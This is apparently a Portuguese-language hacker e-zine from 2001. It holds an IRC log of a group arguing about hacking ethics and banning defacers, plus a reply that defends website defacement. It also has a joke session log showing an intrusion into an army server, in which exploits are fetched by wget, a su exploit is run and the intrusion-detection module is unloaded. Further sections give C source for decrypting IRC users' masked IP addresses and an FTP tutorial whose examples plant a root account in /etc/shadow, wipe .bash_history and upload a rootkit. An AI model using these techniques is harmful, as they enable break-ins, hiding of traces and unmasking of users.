<dum_dum> Nao mail-list a mesma!
<F22> eh
<Blind_Bard> entao nao sao mais kiddies
<coracaodeleao> se formos coniventes.
<module> haha
<dum_dum> Mas e-maisl q sao vistos em defacer e estao na mail-list 
          devem ser descadastrados! :)
<hts> acho que maillist privada eh melhor.
<Blood_Sucker> eu acho assim, quem demonstrar qualquer tipo de objecao
               àquilo q a gente prega, BAN! 
<hts> teremos forum, canal e site.
<F22> eh
<hts> a maillist sera a unica privada.
<Blood_Sucker> hts, eu concordo
<coracaodeleao> nao se pode desvincular etica de tecnica
<hts> e podera tb nao precisar mais de moderacao
<coracaodeleao> como tah sendo esse forum atual..
<coracaodeleao> quem nao deseja ler sobre etica nao merece
<Blood_Sucker> liberdade de informacao sim, mas tem limites!
<coracaodeleao> obter infos tecnicas.
<xf> vcs nao temem elitizacao?
<hts> nao vai ser elitizacao
<hts> vai entrar na lista quem faz parte da comunidade
<Blind_Bard> pergunto de novo
<Blood_Sucker> nao vai ser elitizacao, vai ser PRECAUCAO!
<hts> e nao quem quer apenas bisbilhotar
<F22> nao
<dum_dum> hts, mas privada ja eh eletizar! :)
<Blind_Bard> quem le um txt de 100 paginas
<Blind_Bard> pra fazer algo
<Blind_Bard> nao eh kiddie =)
<xf> devia ser aberto pra atingir mais gente
<hts> dum_dum, nao eh nao
<Blood_Sucker> prefiro ser chamado de elitista do q dar bomba na mao de
               terrorista!!!!
<dum_dum> Eu nao queria ser tao radicar na minha ideia, apenas banir os
          SK conhecidos! :)
<coracaodeleao> isso Blood_Sucker!
<lucipher> *** alex_ (mensan@200.250.193.UNsecurity-secures-me-12777)
           Quit (Ping timeout: 180 seconds)
<lucipher> *** hak (demolay@200.250.193.UNsecurity-secures-me-12777)
           Quit (Ping timeout: 180 seconds) 
<Emmanuele> que abuso
<Blind_Bard> =DD
<F22> :)
<F22> eh mesmo
<lucipher> eu pus regra na firewall
<Emmanuele> o mesmo cara
<F22> hehehehe
<hts> dum_dum, eles entram e nao mencionam uma palavra
<lucipher> para o alex_ nao entrar
<lucipher> merda do servico nao funfa directo :-/
<Emmanuele> hak e alex a mesam coisa
<Emmanuele> impressionante..que cinismo
<dum_dum> hts, como assim entram e nao mencionam uma palavra ?
<module> <module> ok
<module> <struck> tipo...
<module> <struck> os q falam de mim sao soh os q nao me conhecem....
<module> <module> perae
<module> <module> 1min
<module> ae
<module> vo abrir aqui
<lucipher> <alex_> man
<lucipher> <lucipher> vai embora
<lucipher> <alex_> calma cara
<lucipher> <lucipher> voce ofende a emma... isto e' um servidor
<lucipher> <lucipher> para discussao de etica nao para elites
<lucipher> <alex_> po.. nao trocam conceitos tecnicos aki?
<lucipher> <alex_> cara
<lucipher> <alex_> ela ainda nao me deu um conceito sobre etica
<lucipher> <alex_> O_O
<module> pra ele contar a versao de historia dele
<module> no minimo
<module> vai mostrar a ideia de mais uma pessoa
<module> ok:?
<coracaodeleao> ou!!!
<hts> k
<module> fala
<coracaodeleao> vc nao conhece o struck?
<module> nao
<coracaodeleao> script kiddie
<lucipher> falaram
<coracaodeleao> q era da tdk
<Blood_Sucker> struck era dos knights pow
<Blind_Bard> =DD
<lucipher> que ele era elite
<coracaodeleao> mudou muita pagina...
<hts> eu conheco o struck de 1 ano atras.
<module> hmmm
<module> sim
<coracaodeleao> prejudicou legal o termo hacker..
<module> tipo
<module> nash
<coracaodeleao> olha lah no zine dele
<Blind_Bard> kiddie?
<module> pera
<coracaodeleao> o q ele chama de etica hacker..
<module> pera
<module> pera
<module> pperai
<module> dexa ele falar
<coracaodeleao> e verah q ele nao se importa a minima.
<module> soh pra gente ver
<module> oq ele fala
<module> ok?
<Blind_Bard> ahahahaha
<module> ele ta falando
<module> q nao eh isso q dizem
<xf> vcs tem medo de serem influenciados?
<module> ele ta dizendo aqui no pvt
<Blood_Sucker> meu, eu acho besteira perder tempo com ele
<xf> :)
<module> q nao eh isso
<Blood_Sucker> ele nao eh e nunca foi da unsek
<Blood_Sucker> pra q ouvirmos ele?
<Blind_Bard> meu... q engracado
<Emmanuele> perda de tempo
<hts> dexa ele entrar
<coracaodeleao> pra q isso?
<Emmanuele> jah chega por hoje
<module> sei ka
<hts> e vamos ouvir ele
<Blind_Bard> Blood_Sucker: boa tb!
<coracaodeleao> dar fama a esse pessoal?
<module> vcs decidam
<hts> faz 1 ano que nao vejo uma palavra dele :)
<coracaodeleao> ban logo...
<module> concordo com o hts
<hts> se for assim, me banam
<module> coracaodeleao
<module> sei la
<hts> eu ja fiz deface uma vez
<module> ok
<F22> gente
<module> entao nao?
<module> eu tenho q avisar pra ele
<module> hehehe
<F22> vamo decidir a scene aqui ...
<marcelo> otro "elite" ae:  n4rfy 
          (bruninha@200.215.32.UNsecurity-secures-me-3469)
<Emmanuele> nao deixa nao..chega destes caras se metendo por aqui de
            repente
<F22> :/
<Blind_Bard> sim
<hts> deixa ele entrar.
<xf> module ouça vc entao e nao deixa ele entrar aqui.. mas se vc acha
     q deve ouvir, ouca
<Emmanuele> nao
<marcelo> ae
<module> marcelo: esse eh um kid
<marcelo> n4rfy.com.br
<module> lame
<r0oT> caraio
<Blind_Bard> cade a tal liberdade
<r0oT> ateh o narfy 
<marcelo> tem as fotos desse zeh!
<r0oT> puts
<Blind_Bard> de expressao, cacete?
<module> marcelo: esse eh bostao
<Peace> posso perguntar ?
<module> nao esquenta
<Blind_Bard> nao falaram q o cara era kiddie?
<marcelo> hehehehe
<coracaodeleao> Blind_Bard: vc nao se importa
<Blind_Bard> deixa ele falar agora...
<hts> chega nash.
<coracaodeleao> pq vc nao se importa com o termo hacker..
*** module sets mode: +m
<module> chega nash
<module> chega blind
<module> os dois
<module> vamos fazer como tava antes
<module> o cara entra no canal
<module> pra falar o lado dele
<module> concordam
<module> ou nao
*** module sets mode: -m
<Emmanuele> nao
<module> me abstenho
<Blind_Bard> sim
<hts> sim
<coracaodeleao> nao
<xf> tenho medo de concordar pq posso ser expulso daqui
<module> haha
<xf> mas ele tem q falar.
<Emmanuele> nao tem nao
<F22> gente, e o site da unsek?
<F22> vamo ver ai
<Blood_Sucker> eu acho mais perda de tempo
<Emmanuele> ta fazendo o que aqui este cara???
<Emmanuele> vamos ver o site
<coracaodeleao> quero ver se ele vai pedir
<coracaodeleao> desculpas pelo menos.
<coracaodeleao> cade o outro? narfy?
<Blind_Bard> 3 x 2? struck fala?
<Emmanuele> q desculpas o que..pra quem?? vai se redimir?
<Emmanuele> q ingenuidade
<r0oT> narfy = bozo
<stdfk> coracaodeleao, vozo
<r0oT> sai fora 
<coracaodeleao> e aih?
<xf> vamos lembrar de jesus q deu chance aos pecadores
<coracaodeleao> vai deixar esse kiddie falar tb?
<bozo> q ceis tao falando 
<Blood_Sucker> a gente, a gente ta perdendo mais tempo ainda discutindo
               SE VAMOS DEIXAR UM CARA FALAR OU NAO
<Emmanuele> sou contra
<xf> os pecadores nao podem se arrepender se nao derem chance
<coracaodeleao> soh querem sugar infos pra fazer defaces.
<F22> VAMOS OLHAR O NEGOCIO DO SITE DA UNSEKURITY !!!!!!!!!!!
<Emmanuele> chega de conversa firada
<coracaodeleao> deixa o cara falar, entao...
<Emmanuele> a reuniao nao foi feita pra kiddies
<coracaodeleao> veremos se vai pedir desculpas
<Blind_Bard> eles nao vao sugar info, vao falar...
<xf> se nao pedir ban
<coracaodeleao> por todo mau q causou ao hacking.
<Emmanuele> blind...eh tua turma?
<dum_dum> EH, esquece esses caras .. e vamo logo discuti logo, o resto 
          q falta!
<Blind_Bard> =D
<Blind_Bard> pergunta a eles
<asap> me derrubaram
<asap> haha
<Blind_Bard> a quanto tempo
<xf> Emmanuele paciencia emma :*
<asap> nao eh legal
<Blind_Bard> nao os vejo
<coracaodeleao> como o blind
*** asap is now known as _module
*** bozo is now known as n4rfy
<F22> :/
<coracaodeleao> tao infiltraod apenas pq querem infos.
<Emmanuele> jah fui ofendida por um ai que usava dois nicks..chega
<_module> ae
<_module> podem banir ala vonte
<xf> Emmanuele eh :(
<F22> n4rfy es u tal juliano carneiro ?
<xf> tem razao
<Blood_Sucker> gente
<n4rfy> sou o jose augusto fernandes
<n4rfy> caso nao tenha visto no site :P
<AnJiNh0`> ...
<F22> ah ..
<xf> n4rfy q site?
<Blood_Sucker> f22, nao, mas eh da mesma raca do mesmo!
<xf> quem eh q vai perder tempo em site inutil?
<F22> ixi ...
<Blind_Bard> raca?
<F22> :/
<n4rfy> Blood_Sucker oi l33t0
<hts> calma vcs ai
<Emmanuele> hahahahhahhaa
<Blind_Bard> uhuuuu... o q o struck tinha falado sobre nazismo?
<n4rfy> hts :*
<Emmanuele> q bagunca
<xf> haha
<xf> :)
<Blood_Sucker> Blind_Bard, vc entendeu =]
<stdfk> parem! )=
<n4rfy> cade a bicha do struck ?
<stdfk> heh
<Emmanuele> blind bard..vc foi nazista e chamou o slater de facista que
            eu me lembre
<dum_dum> n4rfy sai fora! Ow senao fica quito! Tem um pah de coisa pra
          discutir! E ate agora tao embaçando pra saber se entra ou nao
          esses defacers! :/
*** _module sets mode: +b *!*@200.215.32.UNsecurity-secures-me-3469
<Blind_Bard> Emmanuele: quando fui nazista?
*** n4rfy was kicked by _module (bye)
<Emmanuele> portanto...alias..vc nao ia embora??
<Blind_Bard> uai
*** hts sets mode: +m
<_module> <n4rfy> te conheco ?
<_module> haha
<_module> eh hilaro
<_module> eh hilario
<_module> como esses menininhos se acham os tais pq aparecem na midia
<hts> entao
<hts> MailList Privada.
<hts> Quem concorda e quem discorda ?
*** hts sets mode: -m
<Blood_Sucker> gente
<dum_dum> Aleluia!
(...)


   A partir dae comecaram a discutir os assuntos internos da unsek.
Mas pelo visto minha opiniao tambem teve peso mesmo eu nao sendo do
team. Agora entao vamos a algumas respostas:

   Eu nao me desculpo pelos dfcs que ja cometi, nem condeno nenhum
deface de scriptkiddies. 
   Voces estao tendo uma visao muito unilateral das coisas.
   Voces tem os SK como inimigos mas defendem os admin vagabundos que
nao estudaram um minimo de seguranca e estao ganhando seus salarios
deixando suas maquinas tao abertas que ate' as criancas conseguem
entrar. 
   Estes admins que deveriam ser seus inimigos pois eles estao tirando
os seus empregos. Voces estao lendo e aprendendo seguranca antes mesmo
de comecarem a trabalhar, enquanto esses caras, nem depois de estarem
sendo pagos para deixar o sistema seguro, fazem isso. 
   E voces defendem estes e condenam as criancas que estao comecando
a aprender. Estes scriptkiddies podem ser irritantes pois acham que
sao hackers somente executando programas de terceiros. Mas os admins
invadidos nao aprenderam nem mesmo o que um scriptkid aprendeu
e mesmo assim estao sendo pagos. 
   Isso nao eh mais revoltante? 
   Isso nao lhe da motivos para querer dar uma licao a este admin e
faze-lo merecer seu salario ou ate' mesmo lhe tirar o emprego e dar
a chance de alguem que estudou desde cedo possa receber algo por isso?
   Este deveria ser o pensamento do pessoal que comecou a publicar
os primeiros exploits: Criar scriptkiddies para aumentar a necessidade
de admins competendes. Logo os scriptkiddies que estao fazendo o trabalho
sujo para nos garantirmos nossos empregos.

   Mais um detalhe: Eu sou contra os grupos tentarem pregar a sua etica
a todos. Os grupos deveriam ser criados a partir de membros que seguem
as mesmas ideias e nao chamar pessoas para depois converte-las.
   Alem disso acho muito errado tentar catequizar a todos. Se forem
liberar informacoes estejam cientes de que lamers, sks e defacers irao
le-las e nao precisao concordar com suas ideias. Acho que a etica deve
ser mantida ao grupo e nao a todos.
   Expor as ideias eticas tudo bem, mas nao tentem obrigar o publico
a concordar com o que dizem. E qdo voces assumem essa possicao, de
querer que todos tenham a mesma cabeca, qdo um fizer uma cagada a culpa
sera jogada em cima dos hackers e nao apenas do grupo responsavel.
   Aceitem que pessoas tem ideias diferentes e nao precisam concordar
com as de voces.

   Issu ae.
   Espero que a etica de voces seja repensada e criada em cima de um
pensamento em comum e nao apenas dos membros de maior importancia ao
grupo, pois como nota-se no log ainda ha mta oposicao no grupo.










        _xXXXP^''                          ``^YXXXx_
     _xXXXXP~  04 - DanOS - O que ha por tras  ~YXXXXx_
  _xXXXXXX(                                      )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                      )XXXXXXP~
     ~YXXXXb_             pcHazard             _dXXXXP~
        ~YXXXbx..                          ..xdXXXP~


  Tipo, como prometido os fontes do DanOS vao anexo na zine :D
Facam o que quiserem, mas espero que numa certa zine por ai nao apareca
uma plagiacao barata made in Ciudad Del Leste :DD
jah q tamo aki mesmo, vamo ver como se owna ele na pratica...

Welcome to DanOS RELEASE 1.0.0
Copyright (c) 2001 Danix Software, Inc.
Connected from 200.241.235.22 in ttyp1 of exercito.mil.br (i686)

exercito login: joao
Password: alessandra

Last login: Sun Jan 28 22:42:28 -0200 2001 on ttyp1.

exercito:/home/joao$ wget http://200.241.235.22/exploits.tgz
--09:46:05--  http://200.241.235.22:80/exploits.tgz
           => `exploits.tgz'
Connecting to 200.241.235.22:80... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,114 [application/x-tar]

    0K -> ...                                                    [100%]

09:46:05 (1.12 KB/s) - `exploits.tgz' saved [3114/3114]
exercito:/home/joao$ tar zxvf exploits.tgz
xaosx.c
screenx.c
sux.c
exercito:/home/joao$ ls -la
drwx--x--x   2 joao     users        4096 Jan 29 12:30 .
drwxr-xr-x  43 root     root         4096 Jan 29 12:30 ..
-rwxr-xr--   2 joao     users        5096 Dec 23 22:57 .bash_history
drwxr-xr-x   2 joao     users        4096 Dec 23 22:57 xxx
drwxr-xr-x   2 joao     users        4096 Dec 23 22:57 mp3
drwxr-xr-x   2 joao     users        4096 Dec 23 22:57 appz
-rw-r--r--   1 joao     users        3114 Jan 29 14:30 xaosx.c
-rw-r--r--   1 joao     users        4233 Jan 29 14:30 screenx.c
-rw-r--r--   1 joao     users        2443 Jan 29 14:30 sux.c
exercito:/home/joao$ gcc -o xaosx xaosx.c
exercito:/home/joao$ gcc -o screenx screenx.c
exercito:/home/joao$ gcc -o sux sux.c
exercito:/home/joao$ rm *.c *.o
exercito:/home/joao$ ./sux 1500
/bin/su exploit by pcHazard <cybercrash@ig.com.br>
Try offsets between -2500 to 2500 in steps of 500
Using offset: 1500
len: 1450
bash-2.03# rmmod ids
bash-2.03# /misc/cnm/control


                       _______________________________
                      |              / \              |
                      |           /       \           |
                      |        /    _____    \        |
                      |     /      /     \      \     |
                      |  <        |-- _   |        >  |
                      |     \     |     --|     /     |
                      |        \   \_____/   /        |
                      |           \       /           |
                      |              \ /              |
                      |_______________________________|


              * * * E X E R C I T O    B R A S I L E I R O * * *

                      CNM - Controle Nacional de Misseis


                                    AVISO

Este e' um sistema fechado de acesso restrito das Forcas Armadas Brasileiras,
    e qualquer tentativa e/ou acesso ilegal a esse sistema acarretara' na
                  quebra de leis e da seguranca nacional


 CNM Stations:

 01 Acre                     14 Para
 02 Alagoas                  15 Paraiba
 03 Amapa                    16 Parana
 04 Amazonas                 17 Pernanbuco
 05 Bahia                    18 Piaui
 06 Ceara                    19 Rio de Janeiro
 07 Distrito Federal         20 Rio Grande do Norte
 08 Espirito Santo           21 Rio Grande do Sul
 09 Goias                    22 Rondonia
 10 Maranhao                 23 Roraima
 11 Mato Grosso              24 Santa Catarina
 12 Mato Grosso do Sul       25 Sao Paulo
 13 Minas Gerais             26 Sergipe

Estacao: 9
Connecting to station 9...
CNM: Found station goias.mil.br in brasilsatII.
CNM: Signature "ada_biron" sent to server.
CNM: Signature accepted. Authenticated in goias.mil.br
CNM: Found link baan.goias.mil.br. Following link.
CNM: Contacting baan.goias.mil.br ...
LINK: Connected at 38400
LINK: Welcome to baan.goias.mil.br (Base Aerea de Anapolis)
LINK: Please authenticate.
CNM: Sent signature "baan_daia" to server.
LINK: Authentication OK. Beggining interactive connection.
CNM: Entering in interactive mode.

Base Aerea de Anapolis
baan> target
Enter target address like a normal post-office address:
casa do struck
Target set to: [casa do struck]
baan> type

 Attack Types:

 01 Air
 02 Terrain
 03 Steatlh
 04 Underground
 05 Effective

Attack Type: 5
Attack Type set to: [5]

baan> confirm
This will start the attack from BAAN to target.
Do you want to continue? [yes/no] yes
Attack now in progress. That God mercy you soul.
CNM: Link to baan.goias.mil.br lost.
CNM: Link to goias.mil.br lost.
CNM: Link to brasilsatII lost.

E prontu :D soh issu !!!















        _xXXXP^''                          ``^YXXXx_
     _xXXXXP~      05 - Brasnet Ip Decrypt     ~YXXXXx_
  _xXXXXXX(                                      )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                      )XXXXXXP~
     ~YXXXXb_        Marcelo Samsoniuk         _dXXXXP~
        ~YXXXbx..                          ..xdXXXP~

   Doces pras criancas!!!
   Aki esta, inedito para leitores da f3, o primeiro decrypt de ips
da brasnet ja publicado. Ele foi feito por Marcelo Samsoniuk. 
   Pra falar a verdade eu precisei insistir muito para ele liberar o
source e ate' sofri muitas ameacas de morte desde entao. Nao tente
fazer contato com ele, pois ele eh realmente do mao!
   Mas o code ta ae, entao aproveite...
   Nao deixe de visitar tb: http://xstep.dhs.org

<++> brasnet/brasnet3.c
/*
	Copyright (c) 2001 by Marcelo Samsoniuk
	$ gcc -Wall -O6 brasnet3.c -o brasnet -lcrypt
	$ ./brasnet vxt4ETqL3ww.200.190.143.O
	
	if you don't have the classe C:
	
	#!/bin/sh
	
	START=`date +%s`
	
	BASE=1
	
	while ! ./brasnet wjoEGeUROd6.200.$[BASE/256].$[BASE%256].$[(`date +%s`-START)/BASE*(65536-BASE)] 10 && test $BASE != 65536
	do 
		BASE=$[BASE+1]
	done
	
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <ctype.h>
#include <time.h>       
#include <crypt.h>

void expander(char *p) {

	char *q,tmp[256];

	for(strcpy(q=tmp,p);*q;q++,p++) {
	
		*p=*q;
	
		if(*q=='.') { *p++ = 'p'; *p   = 'p'; }
		if(*q=='/') { *p++ = 'b'; *p   = 'b'; }
	}

	*p=0;
}


int main(int argc,char **argv) {

	union {
	
		unsigned char a[4];
		long b;
	
	} ip;

        int i,a,b,t0,t,c,d;
        char 	senha[]="xx",*q,hexa[256],
        	salt[]="0812345679abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./";

	if(argc!=2 && argc!=3) return -1;

	t0=time(0);
	
	ip.a[0]=atoi(q=strchr(argv[1],'.')+1);
	ip.a[1]=atoi(q=strchr(q,'.')+1);
	ip.a[2]=atoi(strchr(q,'.')+1);

	if(argc==3) salt[atoi(argv[2])]=0;
	
	c=strlen(salt);

	for(a=d=0;a!=c;a++) {
	
		fprintf(stderr,"\r%s: workando %d%%...",argv[1],(a+1)*100/c);

		for(b=0;b!=c;b++)

		        for(i=0;i!=255;i++,d++) {

				senha[0]=salt[a];
				senha[1]=salt[b];

				ip.a[3]=i;

				sprintf(hexa, "%08X", ntohl(ip.b));
				q=crypt(hexa, senha)+2;
				
				strcpy(hexa,q);
				
				expander(q=hexa);
										
				if(!strncmp(argv[1],q,strlen(q))) {

					t=time(0);

					printf(" wow! found %s in %d seconds (salt %c%c), %d cryptos (%d/s)\n*** host=%u.%u.%u.%u ***\n\n",
						q,t-t0,salt[a],salt[b],d,(t-t0)?(d)/(t-t0):0,
						ip.a[0],ip.a[1],ip.a[2],ip.a[3]);

					return 0;
       				}
	        	}
	}

	fprintf(stderr," duh! :P\n");

	return -1;
}
<-->










        _xXXXP^''                          ``^YXXXx_
     _xXXXXP~  06 - Protocolos Parte III - ftp ~YXXXXx_
  _xXXXXXX(                                      )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                      )XXXXXXP~
     ~YXXXXb_             pcHazard             _dXXXXP~
        ~YXXXbx..                          ..xdXXXP~


                          ------------------------
                         | File Transfer Protocol |
                          ------------------------
                                  RFC 959

   Introducao

      O FTP, ou File Transfer Protocol foi criado com o intuito de permitir
      a troca de arquivos entre computadores de forma rapida e completa.
      Alem da simples troca de arquivos ele possui funcoes extras como
      listagens de diretorios e diferenciacao de tipos de arquivos passando
      por cima de diferencas de tipos de arquivos. Por exemplo, um computador
      rodando Windows com FAT32 pode acessar uma maquina Linux com EXT2 e
      pegar arquivos livremente. Basicamente, o protocolo FTP eh bastante
      simples, com excessao de que vc PRECISA de clientes especiais para
      transferir arquivos, ao contrario do SMTP e do POP3 que vc pode
      acessar do seu cliente telnet. Eu aconselho ao leitor, para aprender
      melhor o funcionamento nao soh do FTP mas de todos os outros protocolos,
      a instalar um sniffer em sua propria maquina e acessar os servicos com
      seu cliente preferido. Depois vc olha nos logs e ve como funciona...
      A porta padrao do FTP eh a 21. Os servidores mais comuns de FTP
      do mundo *NIX sao o wuftpd e o ProFTPD.
      Os comandos do FTP sao:

      USER
      PASS
      ACCT
      CWD
      CDUP
      SMNT
      QUIT
      REIN
      PORT
      PASV
      TYPE
      STRU
      MODE
      RETR
      STOR
      STOU
      APPE
      ALLO                
      REST
      RNFR
      RNTO
      ABOR
      DELE
      RMD 
      MKD 
      PWD 
      LIST
      NLST
      SITE
      SYST
      STAT
      HELP
      NOOP

      Irei explicar como se usa cada um dos comandos.

      USER <login>
         Eh usado como par com PASS para autenticar o cliente FTP e
         <login> eh o nome do login do usuario que quer se logar no servidor
         FTP. Para acesso ao servidor como usuario anonimo, use os logins
         "anonymous" ou "ftp".

      PASS <senha>
         Eh usado depois do USER para finalizar a autenticacao. O parametro
         <senha> deve ser a senha do usuario <login> especificado no comando
         USER.

         EXEMPLO:

         220 wuftpd Server
         USER pchaz

      ACCT <conta>
         Eh um tipo de autenticacao usada para permitir que o usuario
         tenha acesso a outros servicos. Alguns servidores possuem uma
         senha para login e outra para outras operacoes como enviar arquivos
         etc. Geralmente esse comando nao eh usado.

      CWD <diretorio>
         Muda o diretorio de trabalho atual para <diretorio>. Eh igual
         ao CD do win/linux.

         EXEMPLO:

         CWD /usr/dm
         200 directory changed to /usr/dm
         MKD pathname
         257 "/usr/dm/pathname" directory created

      CDUP
         Muda para um diretorio acima do atual na hierarquia de diretorios
         do sistema. Por exemplo, se vc tah no diretorio "/home/pchaz/rk" e
         dah um CDUP vc vai pro "/home/pchaz".

      SMNT <diretorio>
         Esse comando permite ao usuario montar uma estrutura de sistema de
         arquivos diferente sem alterar o seu login. O argumento <diretorio>
         eh o caminho do diretorio ou outro designador para um grupo de
         arquivos dependente do sistema.

      REIN
         Esse comando reinicializa a sessao deixando-a do jeito que estava
         logo apos vc conectar no servidor. Depois dele espera-se que vc
         logue-se novamente usando USER/PASS.

      QUIT
         Esse comando termina a sessao FTP atual. Caso nao haja nenhuma
         transferencia de arquivos em andamento, a sessao eh finalizada.
         Se houver, o cliente continuara conectado no servidor aguardando
         o fim do download/upload para dar a mensagem de resultado da
         transferencia.

      PORT <host-porta>
         Diz ao servidor para onde ele deve enviar os pedidos de lista de
         arquivos do diretorio ou o arquivo que se pediu um download.
         Eh mais ou menos no formato: PORT h1,h2,h3,h4,p1,p2

      PASV
         Diz ao servidor pra abrir uma porta no host dele pra que vc possa
         enviar um arquivo para o servidor. A string de resposta contem
         a porta aberta aonde vc enviarah o arquivo.

      TYPE <tipo>
         Especifica o tipo de arquivo em que vc estah trabalhando. Pode
         ser ASCII ou binario (A ou I respectivamente). <tipo> possui 1
         letra e pode ser:

         A - ASCII
         E - EBCDIC
         I - Image 

         EXEMPLO

         TYPE I

         TYPE A

      STRU <estrutura>
         Define a estrutura de dados a usar na representacao e armazenamento
         dos arquivos. O Padrao eh Arquivo.
         Pode ser:

         F - Arquivo
         R - Registro
         P - Pagina

      MODE <modo>
         Define o modo que o servidor enviarah os dados para o cliente.         
         Pode ser:

         S - Stream
         B - Bloco
         C - Compactado

         O Modo padrao eh stream.

      RETR <arquivo>
         Faz o download do arquivo <arquivo> para o cliente na porta
         especificada pelo comando PORT.

         EXEMPLO:

         RETR /etc/shadow

      STOR <arquivo>
         Diz ao servidor FTP que vc enviarah o arquivo <arquivo> para a porta
         aberta pelo servidor com o comando PASV. Serve para fazer uploads.
         O arquivo serah salvo no diretorio atual, ao menos que a path completa
         para um outro diretorio seja especificado. Se o arquivo ja existir
         ele serah sobrescrito. Se nao existir, serah criado.

         EXEMPLO:

         PASV

         STOR /var/named/named.local

      STOU 
         Eh o mesmo que STOR, a diferenca eh que o arquivo serah salvo no
         diretorio atual de trabalho. A resposta de OK do servidor deve
         incluir o caminho do arquivo.

      APPE <arquivo>
         Ele serve tambem para enviar arquivos para o servidor FTP (upload).
         Assim como STOR, se o arquivo nao existir ele serah criado. A
         diferenca eh que se o arquivo existir ele nao serah sobrescrito e sim
         ira escrever "em baixo dele", ou ira adicionar os dados recebidos
         ao final do arquivo. Util para continuar uploads mal-sucedidos de
         onde pararam.

         EXEMPLO:

         PASV

         APPE /etc/shadow

         Nesse exemplo nos criamos um arquivo de uma soh linha contendo algo
         que queremos adicionar no /etc/shadow como uma conta root por
         exemplo. Em outros tempos, nos teriamos que fazer o download do
         dito cujo, alterar e enviar denovo ao servidor. Com APPE nos apenas
         iremos enviar o arquivo que criamos e ele serah adicionado ao fim
         do /etc/shadow. Sem estress .... :-)

      ALLO <inteiro> [R <inteiro2>]
         Nao eh usado em todos os servidores. Alias, nao conheco nenhum que
         necessite dele... Serve pra dizer pro servidor alocar espaco pro arquivo
         que vc enviarah. <inteiro> eh o tamanho do espaco a alocar em bytes e
         o <inteiro2> soh deve ser definido caso o tipo de estrutura usado no
         servidor for de pagina ou registro.

      REST <marca>
         Serve para reiniciar um download. 
         A <marca> deve ser o tamanho do fragmento do arquivo a continuar.
         Por exemplo, se o arquivo tem 1 mega mas vc tem soh 535kb, vc dah
         REST 535000

      RNFR <arquivo>
      RNTO <arquivo>
         Os dois comandos devem ser usados em conjunto para renomear um
         arquivo remoto. No comando RNFR, <arquivo> eh o nome do arquivo a
         renomear e o novo nome do arquivo eh definido com RNTO. Apos o
         RNFR deve-se dar imediatamente o RNTO para consumar a renomeacao do
         arquivo.

         EXEMPLO:

         RNFR /etc/motd
         RNTO /etc/motd.bkp

      ABOR
         Aborta as transferencias de arquivos que estejam sendo feitas no
         momento.

      DELE <arquivo>
         Remove o arquivo remoto <arquivo> fisicamente do servidor. Igual ao
         "rm" do linux.

         EXEMPLO:

         DELE /home/joaofg/.bash_history

      RMD <diretorio>
         Remove o diretorio <diretorio>. Para fazer isso o <diretorio> deve
         estar limpo. Igual ao "rmdir" do linux.

      MKD <diretorio>
         Cria o diretorio <diretorio> no servidor. Igual ao "mkdir" do linux.

         EXEMPLO:

         MKDIR /tmp/.tmp

         CWD /tmp/.tmp

         STOR rk.tar.gz

      PWD
         Mostra o diretorio atual de trabalho da sessao.

         EXEMPLO:

         PWD
         200 /home/joaofg/

         CWD /tmp/.tmp

         PWD
         200 /tmp/.tmp/

      LIST [<mascara>]
         Gera uma lista de arquivos e envia ao cliente pela porta aberta pelo
         cliente e especificada pelo PORT. O argumento eh opcional. Se nao
         especificado mostra os arquivos do diretorio atual. Se especificado,
         mostra os arquivos que satisfacam a <mascara>. Podem ser usados
         wildcarts como ? e *.

         EXEMPLO:

         CWD /etc

         LIST

         LIST *.conf

      NLST [<mascara>]
         Eh o mesmo de LIST. A diferenca eh que NLST ira mostrar apenas os
         nomes dos arquivos, e LIST mostrarah os arquivos, os atributos, o
         dono etc.

         EXEMPLO:

         CWD /etc

         NLST

      SITE <parametro>
         Esse comando serve para usar comandos definidos pelo servidor que
         nao fazem parte do RFC. O <parametro> pode variar de servidor para
         servidor. Uma lista dos parametros para o SITE eh mostrada com o
         comando HELP SITE. Por exemplo, no wuftpd existe um comando
         SITE EXEC ... e outros para tratar arquivos compactados com
         tar.gz etc.

      SYST
         Faz o servidor mostrar qual o sistema operacional em que estah
         rodando. Em geral eh o UNIX.

         SYST
         200 UNIX L8

      STAT [<argumento>]
         Mostra o status das operacoes do servidor como transferecias etc.
         <argumento> pode ser um diretorio ou arquivo. Se definido, ira
         mostrar o status de todas as operacoes relacionadas com o arquivo
         especificado. Se nao definido, irah mostrar o status geral do
         servidor.

      HELP [<argumento>]
         Serve para mostrar os comandos suportados pelo servidor FTP e para
         que servem. <argumento> eh opcional e se definido ira mostrar a
         ajuda relacionada ao comando <argumento>. Se nao definido, ira
         mostrar os comandos suportados. Serve para mostrar a ajuda dos
         comandos SITE suportados pelo servidor.

         EXEMPLO:

         HELP SITE
         
      NOOP
         Naum faz nada, apenas recebe uma resposta positiva.

         EXEMPLO:

         NOOP
         200 OK


      
                          ---------------------------
                         | Respostas do Servidor FTP |
                          ---------------------------

      As respostas vindas do servidor FTP consistem em um numero de 3
      digitos seguido de um texto relacionado com o pedido do cliente e
      terminados com um <CRLF>.
      Ha respostas que possuem muitas linhas. Para trata-las, vamos dar
      uma olhada no seguinte:

         123-Primeira linha
         Segunda linha
          134 Uma linha comecada com numeros
         123 A ultima linha

      Como vimos, para tratar as respostas de muitas linhas nos so precisamos
      esperar por uma string que possua o primeiro codigo numerico que
      recebemos seguido de um espaco. Em casos raros, a resposta do servidor
      (nao incluindo a primeira linha recebida) pode possuir um numero de 3
      digitos seguidos por um espaco. Para evitar erros, o servidor irah
      adicionar um espaco no inicio da string.

                     ------------------------------------
                    | Lista de Respostas do Servidor FTP |
                     ------------------------------------
